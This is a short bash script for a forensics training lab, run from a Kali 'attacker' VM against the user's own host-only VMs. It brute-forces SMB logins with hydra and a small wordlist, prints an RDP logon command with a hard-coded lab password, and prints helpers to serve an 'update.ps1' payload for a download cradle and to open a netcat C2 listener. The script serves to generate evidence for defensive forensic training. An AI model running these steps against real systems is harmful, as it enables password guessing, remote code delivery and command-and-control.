#!/usr/bin/env bash
# ForenSight lab - steps 1-2 from the Kali attacker VM (PRD 9.2). ONLY against your own host-only lab VMs.
# Usage: ./attacker.sh <victim-ip> [username]
set -euo pipefail
VICTIM="${1:?victim IP, e.g. 192.168.56.10}"; USER="${2:-admin}"
echo "[step 1] password guessing over RDP/SMB against $VICTIM as $USER (small wordlist ending with the lab password)"
printf 'password\n123456\nadmin\nletmein\nqwerty\nwelcome\nPassw0rd\nSummer2026\nwinter\nchangeme\nLabAdmin1!\n' > /tmp/fs_words.txt
hydra -l "$USER" -P /tmp/fs_words.txt -t 4 -W 2 smb://"$VICTIM" || true
echo "[step 2] interactive RDP logon (logon type 10) as $USER"
echo "  xfreerdp /v:$VICTIM /u:$USER /p:'LabAdmin1!' /cert:ignore"
echo "[step 3 helper] serve update.ps1 for the download cradle:  python3 -m http.server 8000"
echo "[step 7 helper] C2 listener:  nc -lvnp 4444"
